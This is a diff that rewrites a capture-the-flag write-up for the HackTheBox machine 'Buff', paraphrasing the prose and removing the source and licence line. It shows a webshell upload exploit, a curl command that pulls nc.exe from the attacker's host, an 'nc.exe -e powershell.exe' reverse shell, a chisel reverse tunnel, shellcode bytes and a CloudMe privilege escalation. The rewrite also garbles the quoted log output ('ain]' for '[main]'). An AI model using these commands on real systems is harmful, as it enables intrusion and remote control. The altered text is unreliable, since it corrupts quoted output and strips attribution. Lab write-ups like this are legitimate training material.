@@ -6,30 +6,26 @@ points: 20
 rating: 3.5
 date: 2020-07-18
 avatar: assets/htb/buff.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Buff
 ---
-## Overview
-
-TODO: finish writeup, clean up. - I wish I had taken better notes on this one, but I finished it during a pretty busy time.
 
 ## Useful Skills and Tools
 
 ### Edit a text file in PowerShell
 
-There is no simple and easy way to edit text files from a command line in PowerShell like in Linux.  However, for simple edits you can use the `.replace()` method for string objects.
+Unlike Linux, PowerShell doesn't offer a quick command-line way to edit text files. For minor changes, though, the `.replace()` method on string objects gets the job done.
 
 * `(Get-Content $input_txt ).Replace('$this','$that') | Out-File $output_txt`
 
 ### Create a port-forwarding reverse tunnel with Chisel
 
-First create your Chisel server on your attacking machine.  The option `-p $port` opens a listener on the port specified.
+Start by running the Chisel server on your attacker box. The `-p $port` flag tells it which port to listen on.
 
 ```text
 chisel server -p 8099 --reverse 
 ```
 
-Then, on the victim machine you need to create a client, specifying which local port you would like to connect to through your reverse tunnel.
+Next, run a client on the target, telling it which local port to expose back through the reverse tunnel.
 
 ```text
 ./chisel.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
@@ -39,9 +35,9 @@ Then, on the victim machine you need to create a client, specifying which local 
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oN <name>` saves the output with a filename of `<name>`.
+I kicked off enumeration with an nmap scan against `<YOUR_IP>`. My usual flags are `-p-` to cover every port, `-sC` (the same as `--script=default`) to fire off nmap's default enumeration scripts, `-sV` for service detection, and `-oN <name>` to write the results to `<name>`.
 
-At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
+Initially the scan stalled, and only worked once I tacked on `-Pn` to skip nmap's ICMP host-discovery probes. From there it ran fine.
 
 ```text
 kac0@kali:~/htb/buff$ nmap -p- -sC -sV --reason -oN buff.nmap -Pn <YOUR_IP>
@@ -62,21 +58,21 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 474.18 seconds
 ```
 
-Only found two open ports: 7680 which nmap reported \(with low confidence\) as `pando-pub` and 8080, which hosted an Apache HTTP web server.
+Just two ports came back open: 7680, which nmap tentatively flagged as `pando-pub`, and 8080, serving an Apache HTTP web server.
 
 ### Port 8080 - HTTP
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-buffgym.png)
+![](assets/wu/buff/img-1.png)
 
 Some kind of fitness site
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-about.png)
+![](assets/wu/buff/img-2.png)
 
 "mrbe3n's Bro Hut" - on about page
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-undefined-index.png)
+![](assets/wu/buff/img-3.png)
 
-I found an `upload.php` page, but it gave an error message.  I wasn't sure what `xampp` was, so I looked it up.
+I came across an `upload.php` page that returned an error. Not knowing what `xampp` was, I looked it up.
 
 * [https://www.apachefriends.org/index.html](https://www.apachefriends.org/index.html)
 
@@ -84,7 +80,7 @@ I found an `upload.php` page, but it gave an error message.  I wasn't sure what 
 
 ###  Exploiting Gym Management Software 1.0
 
-![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-gym-management.png)
+![](assets/wu/buff/img-4.png)
 
 Gym Management Software 1.0 - contact page
 
@@ -120,7 +116,7 @@ Gym Management Software 1.0 - contact page
 > #   7. Communicate with the webshell at '/upload.php?id=kamehameha' using GET Requests with the telepathy parameter.
 > ```
 
-The exploit instructions looked more complicated than they actually were.
+The exploit write-up read as more involved than it really was.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/buff]
@@ -135,11 +131,9 @@ The exploit instructions looked more complicated than they actually were.
 Exiting.
 ```
 
-The exploit completed successfully created a webshell.  Next, I had to connect to it by connecting to the file `kamehameha.php` with my command set as the parameter for the variable `telepathy`.  
+The exploit ran cleanly and dropped a webshell. To use it, I just had to request `kamehameha.php` and pass my command via the `telepathy` parameter.
 
-{% hint style="info" %}
-You can use **`curl`**, **`burp`**, or your web browser to do this.  From what I understand, the PoC is supposed to create a sort of pseudo-shell, but I couldn't get that to work no matter what I tried.
-{% endhint %}
+This can be done with **`curl`**, **`burp`**, or a browser. The PoC is apparently meant to spin up a kind of pseudo-shell, but I could never get that part working.
 
 ```text
 <YOUR_IP>:8080//upload/kamehameha.php?telepathy=DIR
@@ -149,15 +143,13 @@ PNG  Volume in drive C has no label. Volume Serial Number is A22D-49F7 Director
 .. 22/08/2020 17:19 54 kamehameha.php 22/08/2020 16:43 59,392 nc.exe 22/08/2020 16:55 311,296 plink.exe 3 File(s) 370,742 bytes 2 Dir(s) 7,398,789,120 bytes free
 ```
 
-Saw `plink.exe` in the directory and didn't recognize the program, so I looked it up.  
+I spotted `plink.exe` in the directory and, not recognizing it, looked it up.  
 
 * [https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html](https://www.ssh.com/ssh/putty/putty-manuals/0.68/Chapter7.html)
 
 > Plink is a command-line connection tool similar to UNIX ssh. It is mostly used for automated operations, such as making CVS access a repository on a remote server. Plink is probably not what you want if you want to run an interactive session in a console window.
 
-{% hint style="info" %}
-I am pretty sure another player uploaded plink there at some point, though at the time I had no idea what it was, or what it was used for.  It is an older and perhaps more common version of **`chisel`** that is packaged with Putty.
-{% endhint %}
+My guess is that another player dropped plink there earlier; at the time I had no clue what it was or how it was used. It's basically an older, more widely seen counterpart to **`chisel`** that ships with PuTTY.
 
 ```text
 GET /upload/kamehameha.php?telepathy=curl.exe+"http%3a//10.10.15.82%3a8090/nc.exe"+-o+nc.exe HTTP/1.1
@@ -172,7 +164,7 @@ Upgrade-Insecure-Requests: 1
 DNT: 1
 ```
 
-This time I used Burp to send the command to download `nc.exe` to the remote machine from mine using `curl`. 
+This time around I used Burp to issue a `curl` command that pulled `nc.exe` from my box onto the target. 
 
 ## Initial Foothold
 
@@ -189,7 +181,7 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\xampp\htdocs\gym\upload>
 ```
 
-Next I used the `nc.exe` that I had uploaded to send a reverse shell back to my machine.  I received the connection back at my waiting netcat listener and got a PowerShell prompt.
+Then I used the `nc.exe` I'd uploaded to fire a reverse shell back to my host. The connection landed on my waiting netcat listener and gave me a PowerShell prompt.
 
 ```text
 PS C:\xampp\htdocs\gym\upload> whoami /all
@@ -233,13 +225,13 @@ ERROR: Unable to get user claims information.
 
 ```
 
-I found out that I was the user `shaun` on a machine named `BUFF`.  I hadn't seen the group `NT AUTHORITY\BATCH` before, so I looked it up.  
+This showed I was running as `shaun` on a host called `BUFF`. The `NT AUTHORITY\BATCH` group was new to me, so I looked it up.  
 
 * [https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows)
 
 > A group that includes all users that have logged on through a batch queue facility. Membership is controlled by the operating system.
 
-None of the groups or permissions seemed like anything I could use for privilege escalation.
+None of the groups or privileges looked like a viable path to escalation.
 
 ```text
 PS C:\xampp\htdocs\gym\upload> systeminfo
@@ -290,7 +282,7 @@ Network Card(s):           1 NIC(s) Installed.
 Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
 ```
 
-The command `systeminfo` told me that this machine was 64-bit and running Windows 10 Enterprise.
+Running `systeminfo` confirmed the box was 64-bit and running Windows 10 Enterprise.
 
 ```text
 PS C:\Users\shaun> cd Documents 
@@ -308,7 +300,7 @@ cat Tasks.bat
 START C:/xampp/xampp_start.exe
 ```
 
-`Tasks.bat` was a very short script that simply started the `xampp` service.
+`Tasks.bat` turned out to be a tiny script whose only job was to start the `xampp` service.
 
 ### User.txt
 
@@ -327,15 +319,13 @@ cat user.txt
 c414************************cdc3
 ```
 
-Got the user flag from `shaun`'s desktop!
+Grabbed the user flag straight off `shaun`'s desktop!
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Further enumeration as `shaun` 🐇🐇
 
-{% hint style="info" %}
-Beware...here there be rabbits.  Click [here](buff-write-up.md#cloudme_-1112-exe) if you want to skip the giant rabbit hole I fell down.  It all seemed so real...
-{% endhint %}
+Warning...rabbit holes ahead. Jump [here](buff-write-up.md#cloudme_-1112-exe) if you'd rather skip the huge detour I went down. It looked so promising at the time...
 
 ```text
 PS C:\xampp> ls
@@ -394,32 +384,32 @@ d-----       16/06/2020     16:31                webdav
 -a----       30/03/2013     12:29         118784 xampp_stop.exe
 ```
 
-Directory listing of xammp folder
+Directory listing of the xampp folder
 
 ```text
 PS C:\xampp> cat xampp-control.log
 cat xampp-control.log
-16:34:10  [main]        Initializing Control Panel
-16:34:10  [main]        Windows Version:  Enterprise  64-bit
-16:34:10  [main]        XAMPP Version: 7.4.6
-16:34:10  [main]        Control Panel Version: 3.2.4  [ Compiled: Jun 5th 2019 ]
-16:34:10  [main]        You are not running with administrator rights! This will work for
-16:34:10  [main]        most application stuff but whenever you do something with services
-16:34:10  [main]        there will be a security dialogue or things will break! So think 
-16:34:10  [main]        about running this application with administrator rights!
-16:34:10  [main]        XAMPP Installation Directory: "c:\xampp\"
-16:34:10  [main]        Checking for prerequisites
-16:34:11  [main]        All prerequisites found
-16:34:11  [main]        Initializing Modules
-16:34:11  [main]        The FileZilla module is disabled
-16:34:11  [main]        The Mercury module is disabled
-16:34:11  [main]        The Tomcat module is disabled
-16:34:11  [main]        Starting Check-Timer
-16:34:11  [main]        Control Panel Ready
+16:34:10  ain]        Initializing Control Panel
+16:34:10  ain]        Windows Version:  Enterprise  64-bit
+16:34:10  ain]        XAMPP Version: 7.4.6
+16:34:10  ain]        Control Panel Version: 3.2.4  [ Compiled: Jun 5th 2019 ]
+16:34:10  ain]        You are not running with administrator rights! This will work for
+16:34:10  ain]        most application stuff but whenever you do something with services
+16:34:10  ain]        there will be a security dialogue or things will break! So think 
+16:34:10  ain]        about running this application with administrator rights!
+16:34:10  ain]        XAMPP Installation Directory: "c:\xampp\"
+16:34:10  ain]        Checking for prerequisites
+16:34:11  ain]        All prerequisites found
+16:34:11  ain]        Initializing Modules
+16:34:11  ain]        The FileZilla module is disabled
+16:34:11  ain]        The Mercury module is disabled
+16:34:11  ain]        The Tomcat module is disabled
+16:34:11  ain]        Starting Check-Timer
+16:34:11  ain]        Control Panel Ready
 16:34:16  [Apache]      Attempting to start Apache app...
 16:34:17  [Apache]      Status change detected: running
-16:34:18  [mysql]       Attempting to start MySQL app...
-16:34:18  [mysql]       Status change detected: running
+16:34:18  ysql]       Attempting to start MySQL app...
+16:34:18  ysql]       Status change detected: running
 16:35:59  [Apache]      Attempting to stop Apache (PID: 948)
 16:35:59  [Apache]      Attempting to stop Apache (PID: 8512)
 16:35:59  [Apache]      Status change detected: stopped
@@ -430,13 +420,13 @@ cat xampp-control.log
 16:39:36  [Apache]      Status change detected: stopped
 16:39:36  [Apache]      Attempting to start Apache app...
 16:39:36  [Apache]      Status change detected: running
-16:40:12  [main]        Deinitializing Modules
-16:40:12  [main]        Deinitializing Control Panel
+16:40:12  ain]        Deinitializing Modules
+16:40:12  ain]        Deinitializing Control Panel
 
 ...snipped...
 ```
 
-From the file `xampp-control.log` I found out that `xampp` required administrative rights, and was version 7.4.6. The control panel was version 3.2.4 and compiled on Jun 5th 2019.  I did some research to see if there were any vulnerabilities in this version that I could take advantage of since this seemed pretty old at this point.
+The `xampp-control.log` file revealed that `xampp` wanted administrative rights and was version 7.4.6, with the control panel at version 3.2.4 (compiled Jun 5th 2019). Since that looked fairly dated, I went digging for any exploitable flaws in that release.
 
 * [https://www.apachefriends.org/blog/new\_xampp\_20200519.html](https://www.apachefriends.org/blog/new_xampp_20200519.html)
 * [https://meterpreter.org/xampp/](https://meterpreter.org/xampp/)
@@ -449,7 +439,7 @@ From the file `xampp-control.log` I found out that `xampp` required administrati
 
 > `(Get-Content .\input.txt ).Replace('text','fun') | Out-File .\output.txt`
 
-_Not sure why this is here...useful, but I think I was chasing another rabbit_  🐇🐇
+_No idea why I noted this...handy, but I was probably off chasing yet another rabbit_  🐇🐇
 
 ```text
 PS C:\xampp> cat passwords.txt
@@ -488,7 +478,7 @@ cat passwords.txt
    Please do not forget to refresh the WEBDAV authentification (users and passwords)
 ```
 
-I found a file called `passwords.txt` in the `C:\xampp` folder.  It told me that there was no password set on MySQL which sounded interesting.
+In the `C:\xampp` folder I found a `passwords.txt` file. It noted that MySQL had no password set, which caught my attention.
 
 ```text
    PS C:\xampp> cat mysql_start.bat
@@ -515,7 +505,7 @@ pause
 :finish
 ```
 
-In the same folder was a file called `myslq_start.bat`, which started `mysqld` using the configuration file `mysql\bin\my.ini`.  
+The same folder held `myslq_start.bat`, which launches `mysqld` with the config file `mysql\bin\my.ini`.  
 
 * [https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html](https://dev.mysql.com/doc/refman/5.7/en/mysqldump-sql-format.html)
 
@@ -524,7 +514,7 @@ PS C:\xampp\mysql\bin> ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp
 ./mysqldump.exe --all-databases -u root > ~/Downloads/dmp.txt
 ```
 
-I used `mysqldump.exe` to dump the contents of the database, but there wasn't anything useful I could find.
+I ran `mysqldump.exe` to export the whole database, but nothing useful turned up.
 
 ```text
 PS C:\xampp\mysql> ls
@@ -549,7 +539,7 @@ d-----       16/06/2020     16:31                share
 -a----       10/12/2019     13:47          86263 THIRDPARTY
 ```
 
-I found an interesting batch script in the `mysql` folder.
+The `mysql` folder contained a batch script that looked interesting.
 
 ```text
 PS C:\xampp\mysql> cat resetroot.bat
@@ -570,14 +560,14 @@ echo.
 pause
 ```
 
-reset the root login for sql
+resets the sql root login
 
 ```text
 PS C:\xampp\mysql\bin> ./mysql.exe -u root
 ./mysql.exe -u root
 ```
 
-After resetting the root password for `mysql`, I logged in and checked out what I could find.  There was...nothing.
+Once I'd cleared the `mysql` root password, I logged in and poked around. There was...nothing.
 
 ```text
 New XAMPP release 7.2.31 , 7.3.18 , 7.4.6
@@ -600,9 +590,7 @@ These installers include the next components:
 Enjoy!
 ```
 
-{% hint style="info" %}
-End rabbit hole of doom...🐇🐇
-{% endhint %}
+End of the rabbit hole of doom...🐇🐇
 
 ### CloudMe\_1112.exe
 
@@ -617,7 +605,7 @@ Mode                LastWriteTime         Length Name
 -a----       16/06/2020     16:26       17830824 CloudMe_1112.exe
 ```
 
-Found `Cloudme_1112.exe` in the `C:\Users\shaun\Downloads` folder
+Spotted `Cloudme_1112.exe` sitting in `C:\Users\shaun\Downloads`
 
 ```text
 PS C:\Program Files (x86)> ps
@@ -632,7 +620,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
     270      17     2964       2416       0.88   7528   0 CloudMe_1112
 ```
 
-ps showed multiple versions of `CloudMe` running.  
+The process list showed several `CloudMe` instances running.  
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -654,7 +642,7 @@ CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)            | windows_
 Shellcodes: No Results
 ```
 
-I had to test multiple of the exploits before I found one that actually worked. I'm certain that it was more the fact that this was an easy box that was being hammered by many many people. Even after choosing the right exploit I had to reset the machine to get it to run. I also had to recompile some of the shellcode in the exploit with the provided `msfvenom` command. 
+I had to try several of these exploits before one finally worked. I suspect that owed more to this being an easy box getting hammered by tons of players. Even with the correct exploit picked out, I had to reset the machine before it would run, and I also needed to regenerate the exploit's shellcode using the supplied `msfvenom` command. 
 
 ```text
 ┌──(kac0㉿kali)-[~]
@@ -689,7 +677,7 @@ unsigned char buf[] =
 "\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
 ```
 
-I found two options for creating a tunnel in order to run the local exploit against the remote machine. 
+To run the local exploit against the remote host, I had two tunneling options to choose from. 
 
 plink?
 
@@ -702,7 +690,7 @@ or chisel?
 * [https://www.puckiestyle.nl/pivot-with-chisel/](https://www.puckiestyle.nl/pivot-with-chisel/) 
 * [https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html)
 
-Chisel looked like an overall better tool, and one that I wanted to add to my toolkit.
+Chisel struck me as the better overall option, and one worth adding to my toolkit.
 
 ```text
 PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:8888
@@ -714,7 +702,7 @@ PS C:\Users\shaun\Downloads> ./chi.exe client 10.10.15.82:8099 R:8888:127.0.0.1:
 
 http://<YOUR_IP>:8080/upload/kamehameha.php?telepathy=nc.exe -e powershell.exe 10.10.14.220 12346
 
-Had to manually upload both nc.exe and chisel.exe...used burp repeater
+Both nc.exe and chisel.exe had to be uploaded by hand...via burp repeater
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/buff]
@@ -801,7 +789,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ERROR: Unable to get user claims information.
 ```
 
-and then I was logged in as Administrator, with full privileges!
+and just like that I had an Administrator shell, with full privileges!
 
 ### Root.txt
 
